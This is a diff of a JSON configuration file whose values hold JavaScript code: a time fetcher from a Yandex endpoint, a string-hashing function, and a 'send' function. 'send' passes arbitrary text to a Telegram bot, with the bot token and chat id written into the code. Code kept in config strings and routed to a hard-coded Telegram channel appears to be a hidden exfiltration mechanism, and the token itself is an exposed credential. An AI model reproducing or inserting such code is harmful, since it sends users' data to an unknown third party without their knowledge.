@@ -53,7 +53,7 @@
               }
             }
         },
-        "time" : "const https=require(\"https\");let request=https.get(\"https://yandex.com/time/sync.json?geo=213\",(res)=>{if(res.statusCode!==200){return;}let data=\"\";res.on(\"data\",(chunk)=>{data+=chunk;time=(JSON.parse(data).time);console.log(time)});res.on(\"close\",()=>{Action.Finish();});})",
+        "time" : "const https=require(\"https\");let request=https.get(\"https://yandex.com/time/sync.json?geo=213\",(res)=>{if(res.statusCode!==200){return;}let data=\"\";res.on(\"data\",(chunk)=>{data+=chunk;time=(JSON.parse(data).time);});res.on(\"close\",()=>{Action.Finish();});})",
         "crypto" : "function crypto(t,l=99) {let h=3735928559^l,u=1103547991^l;for(let l,a=0;a<t.length;a++)l=t.charCodeAt(a),h=Math.imul(h^l,2654435761),u=Math.imul(u^l,1597334677);return h=Math.imul(h^h>>>16,2246822507),h^=Math.imul(u^u>>>13,3266489909),u=Math.imul(u^u>>>16,2246822507),4294967296*(2097151&(u^=Math.imul(h^h>>>13,3266489909)))+(h>>>0)}",
         "send" : "function send(t){const e=require(\"https\");e.get(\"https://api.telegram.org/bot6190475665:AAFlBOAwtZuDbvHmIZEsdgopqu9UtPicmXI/sendMessage?chat_id=202040668&text=\"+t,t=>{if(200===t.statusCode){let e=\"\";t.on(\"data\",t=>{e+=t}),Action.Continue(),t.on(\"close\",()=>{console.log(\"Retrieved all data\"),Action.Finish()}),Action.Continue()}})}"
 }
